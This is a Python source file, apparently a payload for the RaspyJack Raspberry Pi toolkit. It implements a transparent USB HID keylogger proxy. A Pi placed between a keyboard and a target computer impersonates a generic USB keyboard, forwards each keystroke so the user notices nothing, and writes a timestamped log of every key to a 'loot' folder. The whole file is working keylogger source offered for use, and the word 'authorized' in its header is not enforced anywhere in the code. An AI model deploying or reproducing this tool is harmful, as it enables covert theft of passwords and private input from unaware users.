#!/usr/bin/env python3
# @name: Transparent USB HID Keylogger Proxy
# @desc: Proxy an attached USB keyboard through the Pi's HID gadget, mirror keystrokes to the target, and save an authorized keystroke log to loot.
# @category: usb
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"seconds","label":"Logging duration","type":"number","default":"300"}]
"""
RaspyJack Payload -- Transparent USB HID Keylogger Proxy
=========================================================
Author: 7h30th3r0n3

The Pi sits between a USB keyboard and the target computer.
USB port 1 (host mode) reads keystrokes via evdev.
USB port 2 (OTG) is configured as a HID gadget (/dev/hidg0)
that forwards every keystroke transparently to the target.

All keystrokes are logged to $CITYPOP_ROOT/loot/Keylogger/.

Setup / Prerequisites:
  - Requires 2 USB ports. Port 1: keyboard plugged in (host mode,
    evdev). Port 2: USB OTG to target (gadget HID).
  - Pi transparently proxies keystrokes while logging.
  - Requires python3-evdev.

Controls (CLI):
  python3 usb_keylogger.py [--duration SECONDS]

  --duration SECONDS  Optional. Stop automatically after this many
                       seconds. If omitted, runs until Ctrl-C.

  Logging starts as soon as a keyboard input device is found. Status
  (keystroke count, uptime, last keys) is printed periodically, and the
  full log is exported to loot on exit. Press Ctrl-C at any time to
  stop cleanly.
"""

import os
import sys
import time
import struct
import argparse
import threading
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'Keylogger')
GADGET_BASE = "/sys/kernel/config/usb_gadget"
GADGET_NAME = "raspyjack_keylog"
HID_DEV = "/dev/hidg0"
EVDEV_DIR = "/dev/input"

os.makedirs(LOOT_DIR, exist_ok=True)

# ---------------------------------------------------------------------------
# Evdev constants (linux/input-event-codes.h)
# ---------------------------------------------------------------------------
EV_KEY = 0x01
KEY_STATE_DOWN = 1
KEY_STATE_UP = 0
EVDEV_EVENT_SIZE = struct.calcsize("llHHI")

# ---------------------------------------------------------------------------
# Evdev keycode -> (HID keycode, label, needs_shift)
# ---------------------------------------------------------------------------
EVDEV_TO_HID = {
    # Letters a-z: evdev 30-38 (a-i), 44-50 (k-q?), etc.
    # Using linux KEY_* codes
    1: (0x29, "ESC", False),         # KEY_ESC
    2: (0x1E, "1", False),           # KEY_1
    3: (0x1F, "2", False),           # KEY_2
    4: (0x20, "3", False),           # KEY_3
    5: (0x21, "4", False),           # KEY_4
    6: (0x22, "5", False),           # KEY_5
    7: (0x23, "6", False),           # KEY_6
    8: (0x24, "7", False),           # KEY_7
    9: (0x25, "8", False),           # KEY_8
    10: (0x26, "9", False),          # KEY_9
    11: (0x27, "0", False),          # KEY_0
    12: (0x2D, "-", False),          # KEY_MINUS
    13: (0x2E, "=", False),          # KEY_EQUAL
    14: (0x2A, "BKSP", False),       # KEY_BACKSPACE
    15: (0x2B, "TAB", False),        # KEY_TAB
    16: (0x14, "q", False),          # KEY_Q
    17: (0x1A, "w", False),          # KEY_W
    18: (0x08, "e", False),          # KEY_E
    19: (0x15, "r", False),          # KEY_R
    20: (0x17, "t", False),          # KEY_T
    21: (0x1C, "y", False),          # KEY_Y
    22: (0x18, "u", False),          # KEY_U
    23: (0x0C, "i", False),          # KEY_I
    24: (0x12, "o", False),          # KEY_O
    25: (0x13, "p", False),          # KEY_P
    26: (0x2F, "[", False),          # KEY_LEFTBRACE
    27: (0x30, "]", False),          # KEY_RIGHTBRACE
    28: (0x28, "ENTER", False),      # KEY_ENTER
    29: (0xE0, "LCTRL", False),      # KEY_LEFTCTRL (modifier)
    30: (0x04, "a", False),          # KEY_A
    31: (0x16, "s", False),          # KEY_S
    32: (0x07, "d", False),          # KEY_D
    33: (0x09, "f", False),          # KEY_F
    34: (0x0A, "g", False),          # KEY_G
    35: (0x0B, "h", False),          # KEY_H
    36: (0x0D, "j", False),          # KEY_J
    37: (0x0E, "k", False),          # KEY_K
    38: (0x0F, "l", False),          # KEY_L
    39: (0x33, ";", False),          # KEY_SEMICOLON
    40: (0x34, "'", False),          # KEY_APOSTROPHE
    41: (0x35, "`", False),          # KEY_GRAVE
    42: (0xE1, "LSHIFT", False),     # KEY_LEFTSHIFT (modifier)
    43: (0x31, "\\", False),         # KEY_BACKSLASH
    44: (0x1D, "z", False),          # KEY_Z
    45: (0x1B, "x", False),          # KEY_X
    46: (0x06, "c", False),          # KEY_C
    47: (0x19, "v", False),          # KEY_V
    48: (0x05, "b", False),          # KEY_B
    49: (0x11, "n", False),          # KEY_N
    50: (0x10, "m", False),          # KEY_M
    51: (0x36, ",", False),          # KEY_COMMA
    52: (0x37, ".", False),          # KEY_DOT
    53: (0x38, "/", False),          # KEY_SLASH
    54: (0xE5, "RSHIFT", False),     # KEY_RIGHTSHIFT (modifier)
    55: (0x55, "KP*", False),        # KEY_KPASTERISK
    56: (0xE2, "LALT", False),       # KEY_LEFTALT (modifier)
    57: (0x2C, "SPACE", False),      # KEY_SPACE
    58: (0x39, "CAPS", False),       # KEY_CAPSLOCK
    59: (0x3A, "F1", False),         # KEY_F1
    60: (0x3B, "F2", False),         # KEY_F2
    61: (0x3C, "F3", False),         # KEY_F3
    62: (0x3D, "F4", False),         # KEY_F4
    63: (0x3E, "F5", False),         # KEY_F5
    64: (0x3F, "F6", False),         # KEY_F6
    65: (0x40, "F7", False),         # KEY_F7
    66: (0x41, "F8", False),         # KEY_F8
    67: (0x42, "F9", False),         # KEY_F9
    68: (0x43, "F10", False),        # KEY_F10
    87: (0x44, "F11", False),        # KEY_F11
    88: (0x45, "F12", False),        # KEY_F12
    96: (0x58, "KPENT", False),      # KEY_KPENTER
    97: (0xE4, "RCTRL", False),      # KEY_RIGHTCTRL (modifier)
    100: (0xE6, "RALT", False),      # KEY_RIGHTALT (modifier)
    102: (0x4A, "HOME", False),      # KEY_HOME
    103: (0x52, "UP", False),        # KEY_UP
    104: (0x4B, "PGUP", False),      # KEY_PAGEUP
    105: (0x50, "LEFT", False),      # KEY_LEFT
    106: (0x4F, "RIGHT", False),     # KEY_RIGHT
    107: (0x4D, "END", False),       # KEY_END
    108: (0x51, "DOWN", False),      # KEY_DOWN
    109: (0x4E, "PGDN", False),      # KEY_PAGEDOWN
    110: (0x49, "INS", False),       # KEY_INSERT
    111: (0x4C, "DEL", False),       # KEY_DELETE
    125: (0xE3, "LGUI", False),      # KEY_LEFTMETA (modifier)
    126: (0xE7, "RGUI", False),      # KEY_RIGHTMETA (modifier)
}

# HID modifier bit masks (keycodes 0xE0-0xE7)
_MODIFIER_BITS = {
    0xE0: 0x01,  # Left Ctrl
    0xE1: 0x02,  # Left Shift
    0xE2: 0x04,  # Left Alt
    0xE3: 0x08,  # Left GUI
    0xE4: 0x10,  # Right Ctrl
    0xE5: 0x20,  # Right Shift
    0xE6: 0x40,  # Right Alt
    0xE7: 0x80,  # Right GUI
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = False
logging_active = False
keystroke_count = 0
last_keys = []          # last 3 key labels
key_history = []        # full history of (timestamp, label) tuples
start_time = 0.0
status_msg = "Idle"
gadget_configured = False

# Current pressed keys for HID report
_pressed_modifiers = 0
_pressed_keys = []      # up to 6 HID keycodes


# ---------------------------------------------------------------------------
# USB Gadget configfs setup
# ---------------------------------------------------------------------------

def _write_file(path, content):
    """Write content to a sysfs/configfs file."""
    try:
        with open(path, "w") as f:
            f.write(content)
        return True
    except Exception:
        return False


def _setup_gadget():
    """Configure USB HID keyboard gadget via configfs on OTG port."""
    global gadget_configured

    gadget_dir = os.path.join(GADGET_BASE, GADGET_NAME)

    if os.path.isdir(gadget_dir):
        with lock:
            gadget_configured = True
        return True

    try:
        os.makedirs(gadget_dir, exist_ok=True)
        _write_file(os.path.join(gadget_dir, "idVendor"), "0x1d6b")
        _write_file(os.path.join(gadget_dir, "idProduct"), "0x0104")
        _write_file(os.path.join(gadget_dir, "bcdDevice"), "0x0100")
        _write_file(os.path.join(gadget_dir, "bcdUSB"), "0x0200")

        strings_dir = os.path.join(gadget_dir, "strings", "0x409")
        os.makedirs(strings_dir, exist_ok=True)
        _write_file(os.path.join(strings_dir, "serialnumber"), "000000000002")
        _write_file(os.path.join(strings_dir, "manufacturer"), "Generic")
        _write_file(os.path.join(strings_dir, "product"), "USB Keyboard")

        config_dir = os.path.join(gadget_dir, "configs", "c.1")
        config_strings = os.path.join(config_dir, "strings", "0x409")
        os.makedirs(config_strings, exist_ok=True)
        _write_file(os.path.join(config_dir, "MaxPower"), "250")
        _write_file(os.path.join(config_strings, "configuration"), "Config 1")

        func_dir = os.path.join(gadget_dir, "functions", "hid.usb0")
        os.makedirs(func_dir, exist_ok=True)
        _write_file(os.path.join(func_dir, "protocol"), "1")
        _write_file(os.path.join(func_dir, "subclass"), "1")
        _write_file(os.path.join(func_dir, "report_length"), "8")

        report_desc = bytes([
            0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
            0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7,
            0x15, 0x00, 0x25, 0x01, 0x75, 0x01,
            0x95, 0x08, 0x81, 0x02,
            0x95, 0x01, 0x75, 0x08, 0x81, 0x01,
            0x95, 0x05, 0x75, 0x01, 0x05, 0x08,
            0x19, 0x01, 0x29, 0x05, 0x91, 0x02,
            0x95, 0x01, 0x75, 0x03, 0x91, 0x01,
            0x95, 0x06, 0x75, 0x08, 0x15, 0x00,
            0x25, 0x65, 0x05, 0x07, 0x19, 0x00,
            0x29, 0x65, 0x81, 0x00, 0xC0,
        ])
        with open(os.path.join(func_dir, "report_desc"), "wb") as f:
            f.write(report_desc)

        link_path = os.path.join(config_dir, "hid.usb0")
        if not os.path.exists(link_path):
            os.symlink(func_dir, link_path)

        udc_list = os.listdir("/sys/class/udc")
        if udc_list:
            _write_file(os.path.join(gadget_dir, "UDC"), udc_list[0])

        with lock:
            gadget_configured = True
        return True

    except Exception:
        with lock:
            gadget_configured = False
        return False


def _teardown_gadget():
    """Remove USB gadget configuration."""
    global gadget_configured

    gadget_dir = os.path.join(GADGET_BASE, GADGET_NAME)
    if not os.path.isdir(gadget_dir):
        return

    try:
        _write_file(os.path.join(gadget_dir, "UDC"), "")
        time.sleep(0.3)
        link_path = os.path.join(gadget_dir, "configs", "c.1", "hid.usb0")
        if os.path.islink(link_path):
            os.unlink(link_path)
        for subdir in [
            "configs/c.1/strings/0x409", "configs/c.1",
            "functions/hid.usb0", "strings/0x409",
        ]:
            path = os.path.join(gadget_dir, subdir)
            if os.path.isdir(path):
                try:
                    os.rmdir(path)
                except OSError:
                    pass
        try:
            os.rmdir(gadget_dir)
        except OSError:
            pass
    except Exception:
        pass

    with lock:
        gadget_configured = False


# ---------------------------------------------------------------------------
# Evdev keyboard detection
# ---------------------------------------------------------------------------

def _find_keyboard_device():
    """Scan /dev/input/event* for a device with keyboard capability."""
    for entry in sorted(os.listdir(EVDEV_DIR)):
        if not entry.startswith("event"):
            continue
        dev_path = os.path.join(EVDEV_DIR, entry)
        caps_path = f"/sys/class/input/{entry}/device/capabilities/key"
        try:
            with open(caps_path, "r") as f:
                caps = f.read().strip()
            # A keyboard typically has bits set for letter keys (KEY_A=30 etc.)
            # Check if capability bitmap is substantial (keyboards have many bits)
            cap_int = int(caps.replace(" ", ""), 16)
            # KEY_A is bit 30 -- check it is set
            if cap_int & (1 << 30):
                return dev_path
        except (FileNotFoundError, ValueError, PermissionError):
            continue
    return None


# ---------------------------------------------------------------------------
# HID report forwarding
# ---------------------------------------------------------------------------

def _build_hid_report(modifiers, keys):
    """Build 8-byte HID keyboard report."""
    padded = (list(keys) + [0, 0, 0, 0, 0, 0])[:6]
    return struct.pack(
        "BBBBBBBB",
        modifiers, 0,
        padded[0], padded[1], padded[2],
        padded[3], padded[4], padded[5],
    )


def _send_report(modifiers, keys):
    """Write HID report to /dev/hidg0."""
    report = _build_hid_report(modifiers, keys)
    try:
        with open(HID_DEV, "rb+") as f:
            f.write(report)
            f.flush()
        return True
    except Exception:
        return False


# ---------------------------------------------------------------------------
# Keylogger thread
# ---------------------------------------------------------------------------

def _log_keystroke(label):
    """Record a keystroke with timestamp."""
    global keystroke_count, last_keys, key_history

    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    with lock:
        keystroke_count += 1
        last_keys = (last_keys + [label])[-3:]
        key_history = key_history + [(ts, label)]


def _keylogger_loop(dev_path):
    """Read evdev events from keyboard, forward to HID gadget, log keys."""
    global _pressed_modifiers, _pressed_keys, logging_active, status_msg

    try:
        fd = os.open(dev_path, os.O_RDONLY)
    except OSError as exc:
        with lock:
            status_msg = f"Open fail: {str(exc)[:16]}"
            logging_active = False
        return

    with lock:
        status_msg = "Logging..."

    try:
        while True:
            with lock:
                if not logging_active:
                    break

            try:
                data = os.read(fd, EVDEV_EVENT_SIZE)
            except OSError:
                break

            if len(data) < EVDEV_EVENT_SIZE:
                continue

            _sec, _usec, ev_type, ev_code, ev_value = struct.unpack(
                "llHHI", data
            )

            if ev_type != EV_KEY:
                continue

            mapping = EVDEV_TO_HID.get(ev_code)
            if mapping is None:
                continue

            hid_code, label, _ = mapping
            mod_bit = _MODIFIER_BITS.get(hid_code, 0)

            if ev_value == KEY_STATE_DOWN:
                if mod_bit:
                    _pressed_modifiers |= mod_bit
                else:
                    if hid_code not in _pressed_keys:
                        _pressed_keys = (_pressed_keys + [hid_code])[:6]
                _log_keystroke(label)

            elif ev_value == KEY_STATE_UP:
                if mod_bit:
                    _pressed_modifiers &= ~mod_bit
                else:
                    _pressed_keys = [
                        k for k in _pressed_keys if k != hid_code
                    ]

            # Forward to target via HID gadget
            _send_report(_pressed_modifiers, _pressed_keys)

    finally:
        os.close(fd)
        # Send empty report on stop
        _send_report(0, [])


# ---------------------------------------------------------------------------
# Export log
# ---------------------------------------------------------------------------

def _export_log():
    """Write current key history to a timestamped log file."""
    with lock:
        snapshot = list(key_history)
        count = keystroke_count

    if not snapshot:
        return "No keys to export"

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"keylog_{ts}.txt")
    try:
        lines = [f"Keylogger export -- {ts}", f"Total: {count} keys", ""]
        for stamp, label in snapshot:
            lines.append(f"[{stamp}] {label}")
        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")
        return f"Saved {os.path.basename(path)}"
    except Exception as exc:
        return f"Err: {str(exc)[:20]}"


# ---------------------------------------------------------------------------
# Drawing
# ---------------------------------------------------------------------------

def _uptime_str():
    """Return a human-readable uptime since logging started."""
    with lock:
        st = start_time
    if st <= 0:
        return "00:00"
    elapsed = int(time.time() - st)
    mins, secs = divmod(elapsed, 60)
    hrs, mins = divmod(mins, 60)
    if hrs:
        return f"{hrs}h{mins:02d}m"
    return f"{mins:02d}:{secs:02d}"


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global logging_active, status_msg, start_time

    parser = argparse.ArgumentParser(
        description="Transparent USB HID Keylogger Proxy - forward "
                     "keystrokes from a connected keyboard to the HID "
                     "gadget while logging them.",
    )
    parser.add_argument(
        "--duration", type=float, default=None,
        help="Stop automatically after this many seconds. If omitted, "
             "runs until Ctrl-C.",
    )
    parser.add_argument("web_duration", nargs="?", type=float, help=argparse.SUPPRESS)
    opts = parser.parse_args()
    if opts.duration is None:
        opts.duration = opts.web_duration

    gadget_ok = _setup_gadget()
    with lock:
        status_msg = "Gadget ready" if gadget_ok else "Gadget N/A"
    print(
        f"Gadget: {'ready' if gadget_ok else 'unavailable (logging continues without HID forwarding)'}",
        flush=True,
    )

    dev = _find_keyboard_device()
    if dev is None:
        print("No keyboard input device found.", flush=True)
        _teardown_gadget()
        return 1

    print(f"Found keyboard: {dev}", flush=True)
    with lock:
        logging_active = True
        start_time = time.time()

    thread = threading.Thread(target=_keylogger_loop, args=(dev,), daemon=True)
    thread.start()

    print(
        "Logging started"
        + (f" (timeout {opts.duration:.0f}s)" if opts.duration is not None else "")
        + ". Press Ctrl-C to stop.",
        flush=True,
    )

    start = time.time()
    last_status = 0.0
    try:
        while thread.is_alive():
            now = time.time()
            if now - last_status >= 5.0:
                with lock:
                    count = keystroke_count
                    last3 = list(last_keys)
                last_str = " ".join(last3) if last3 else "(none)"
                print(
                    f"[{_uptime_str()}] keys={count} last={last_str}",
                    flush=True,
                )
                last_status = now

            if opts.duration is not None and (now - start) >= opts.duration:
                print(f"Duration {opts.duration:.0f}s elapsed; stopping.", flush=True)
                with lock:
                    logging_active = False
                break

            time.sleep(0.2)
    except KeyboardInterrupt:
        print("\nInterrupted by operator; stopping...", flush=True)
        with lock:
            logging_active = False
    finally:
        thread.join(timeout=5)
        result = _export_log()
        print(result, flush=True)
        _teardown_gadget()

    with lock:
        total = keystroke_count
    print(f"Done. {total} keystroke(s) logged.", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
